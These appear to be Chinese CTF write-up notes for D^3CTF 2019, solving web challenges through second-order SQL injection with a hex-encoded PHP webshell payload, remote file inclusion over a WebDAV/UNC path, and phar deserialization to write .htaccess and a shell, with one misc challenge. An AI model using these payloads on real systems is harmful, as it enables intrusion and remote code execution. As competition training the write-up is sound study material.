# d3ctf



## wp

 https://github.com/wqmsybpw/wqmsybpw.github.io/blob/1401b571d975fec748a84a47691e468187a80ef8/_posts/2019-11-25-2019d3ctf-writeup.md 

 [https://nikoeurus.github.io/2019/11/26/D%5E3ctf-Web/](https://nikoeurus.github.io/2019/11/26/D^3ctf-Web/) 





## web

### ezweb



![image.png](http://ww1.sinaimg.cn/large/006pWR9agy1g97tefki11j30ao01s743.jpg)

和username有关?

x  注册一个用户名为:`*/echo 1231231231;/*`的用户

二次注入,User 的index方法调用get_view

![image.png](http://ww1.sinaimg.cn/large/006pWR9aly1g985asdayuj30pm027dfx.jpg)



![image.png](http://ww1.sinaimg.cn/large/006pWR9aly1g985c901tuj30u208vmxr.jpg)



利用替换{来绕过select 和 union的过滤,利用0x....来绕过{的过滤

最后的payload

注册一个用户名为`aaa' unio{n selec}t 0x7B7B7068707D7D6576616C28245F504F53545B615D293B7B7B2F7068707D7D limit 1,1#`成功拿到shell权限







 d3ctf{Th4at's_A_Si11y_P0p_chi4n} 





###  fakeonlinephp

报错

```

Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1

Warning: include(http://39.108.164.219:60005/1.txt): failed to open stream: no suitable wrapper could be found in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1

Warning: include(): Failed opening 'http://39.108.164.219:60005/1.txt' for inclusion (include_path='.;C:\Users\Public\Videos;\c:\php\includes;c:\php\pear;') in C:\Users\w1nd\Desktop\web\nginx-1.17.6\html\index.php on line 1
```

虽然禁用了http协议,但是还是会发送请求

unc路径远程文件包含

一键启动一个webdav服务器

`docker run -v /root/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav`然后把php文件放到/root/webdav/data里就行了

http://02f4483e31.fakeonelinephp.d3ctf.io/?orange=C:/Users/w1nd/AppData/Local/Temp/fffffffffuckccrf

eval($_COOKIE['a']);



whois

```
Domain Name: D3CTF.IO
Registry Domain ID: D503300001132938421-LRMS
Registrar WHOIS Server: whois.namesilo.com
Registrar URL: http://www.namesilo.com
Updated Date: 2019-10-14T20:31:26Z
Creation Date: 2019-08-15T11:56:00Z
Registry Expiry Date: 2020-08-15T11:56:00Z
Registrar Registration Expiration Date:
Registrar: Namesilo, LLC
Registrar IANA ID: 1479
Registrar Abuse Contact Email: 
Registrar Abuse Contact Phone: +1.4805240066
Reseller:
Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
Registrant Organization: See PrivacyGuardian.org
Registrant State/Province: AZ
Registrant Country: US
Name Server: DNS21.HICHINA.COM
Name Server: DNS22.HICHINA.COM
DNSSEC: unsigned

The Registrar of Record identified in this output may have an RDDS service that can be queried 
for additional information on how to contact the Registrant, Admin, or Tech contact of the 
queried domain name.
```



```
本站数据：香港特别行政区 腾讯云
参考数据1：香港 tencent.com
参考数据2：美国
兼容IPv6地址：::966D:4AEA
映射IPv6地址：::FFFF:966D:4AEA
```



whoami

```
whoami /all

USER INFORMATION
----------------

User Name        SID                                         
================ ============================================
172_19_97_4\w1nd S-1-5-21-330377560-317033357-2560255023-1001


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


```



### upload

```php
<?php
class dir{
    public $userdir;
    public $url;
    public $filename;
    public function __construct($url,$filename) {
        $this->userdir = "upload/" . md5($_SERVER["HTTP_HOST"]);
        $this->url = $url;
        $this->filename  =  $filename;
        if (!file_exists($this->userdir)) {
            mkdir($this->userdir, 0777, true);
        }
    }
    public function checkdir(){
        if ($this->userdir != "upload/" . md5($_SERVER["HTTP_HOST"])) {
            die('hacker!!!');
        }
    }
    public function checkurl(){
        $r = parse_url($this->url);
        if (!isset($r['scheme']) || preg_match("/file|php/i",$r['scheme'])){
            die('hacker!!!');
        }
    }
    public function checkext(){
        if (stristr($this->filename,'..')){
            die('hacker!!!');
        }
        if (stristr($this->filename,'/')){
            die('hacker!!!');
        }
        $ext = substr($this->filename, strrpos($this->filename, ".") + 1);
        if (preg_match("/ph/i", $ext)){
            die('hacker!!!');
        }
    }
    public function upload(){
        $this->checkdir();
        $this->checkurl();
        $this->checkext();
        $content = file_get_contents($this->url,NULL,NULL,0,2048);
        if (preg_match("/\<\?|value|on|type|flag|auto|set|\\\\/i", $content)){
            die('hacker!!!');
        }
        file_put_contents($this->userdir."/".$this->filename,$content);
    }
    public function remove(){
        $this->checkdir();
        $this->checkext();
        if (file_exists($this->userdir."/".$this->filename)){
            unlink($this->userdir."/".$this->filename);
        }
    }
    public function count($dir) {
        if ($dir === ''){
            $num = count(scandir($this->userdir)) - 2;
        }
        else {
            $num = count(scandir($dir)) - 2;
        }
        if($num > 0) {
            return "you have $num files";
        }
        else{
            return "you don't have file";
        }
    }
    public function __toString() {
        return implode(" ",scandir(__DIR__."/".$this->userdir));
    }
    public function __destruct() {
        $string = "your file in : ".$this->userdir;
        file_put_contents($this->filename.".txt", $string);
        echo $string;
    }
}

if (!isset($_POST['action']) || !isset($_POST['url']) || !isset($_POST['filename'])){
    highlight_file(__FILE__);
    die();
}

$dir = new dir($_POST['url'],$_POST['filename']);
if($_POST['action'] === "upload") {
    $dir->upload();
}
elseif ($_POST['action'] === "remove") {
    $dir->remove();
}
elseif ($_POST['action'] === "count") {
    if (!isset($_POST['dir'])){
        echo $dir->count('');
    } else {
        echo $dir->count($_POST['dir']);
    }
}
```



> webroot in /var/www/html
>Notice:scanner is useless
>hint1: webroot changes every 10 mins
>hint2: glob
>hint3: https://www.php.net/manual/en/language.oop5.decon.php  ** Pay attention to the notes in the article **







#### 反序列化

upload处url可控,所以只要上传一个phar文件便可以反序列化

利用这个能做到:

1. 扫目录`__destruct__=>__toString__`
2. 任意位置写文件,但是因为上传phar文件时有过滤,所以文件内容也有所限制

但是

`phar://phar.phar.gz/test.txt`

`将phar文件压缩后便可以绕过文件限制`

于是我们就可以在任意位置写文件的权限了



于是我们有这样的思路:利用upload写一个htaccess,然后再利用反序列化写一个shell。

这里有个坑点就是，web主目录每隔10分钟变化一次,但是我们仍然可以利用反序列化来读取web目录



按照上述步骤成功拿到shell

![image.png](http://ww1.sinaimg.cn/large/006pWR9agy1g9bmy4tnlxj30ja05mglr.jpg)

输入phpinfo()发现,有disable_function里禁用了system等函数,这就不爽了。但是php版本是7.2，上传



 https://github.com/mm0r1/exploits  这个老兄写的绕过disable_function的脚本，爽死了。



![image.png](http://ww1.sinaimg.cn/large/006pWR9agy1g9bmyvlo98j30ga03ywej.jpg)



## misc

###  c+c

readme.txt

>This is a lite (which means there is no voice but the script is complete.) version of a great galgame (a.k.a. Visual Novel) written by Romeo Tanaka. Hope you enjoy it.
>PS: I did some small hack to the game for cracking. But you still need steam running to play this game.
>PSS: If you like it, you can buy it on steam.
>PSSS: Do not forget to find the flag. And the flag is just in THIS file.

![image.png](http://ww1.sinaimg.cn/large/006pWR9agy1g976rzdu69j30j001aglt.jpg)



游戏中会出现

![image.png](http://ww1.sinaimg.cn/large/006pWR9agy1g976tjarq4j308k01nt8n.jpg)

一些不可见字符8个以上,可能是flag?

```lua
function L0_0()
  local L0_32, L1_33, L2_34, L3_35
  L0_32 = {
    L1_33,
    L2_34,
    L3_35,
    172,
    21,
    149,
    198,
    139,
    38,
    63,
    174,
    238,
    232,
    20,
    85,
    107
  }
  L1_33 = 221
  L2_34 = 179
  L3_35 = 102
  L1_33 = 166
  L2_34 = 44
  L3_35 = "{"
  for _FORV_7_ = 1, #L0_32 do
    L3_35 = L3_35 .. string.format("%02x", L0_32[_FORV_7_] ~ L1_33)
    if _FORV_7_ == 4 or _FORV_7_ == 6 or _FORV_7_ == 8 or _FORV_7_ == 10 then
      L3_35 = L3_35 .. "-"
    end
  end
  L3_35 = L3_35 .. "}"
  return "", "", string.upper(L3_35), L2_34
    
end
```

su直接去买了原版游戏，对比发现只有dll，exe文件不同

![image.png](http://ww1.sinaimg.cn/large/006pWR9agy1g97whcjur2j31ya0poq7p.jpg)

阵亡

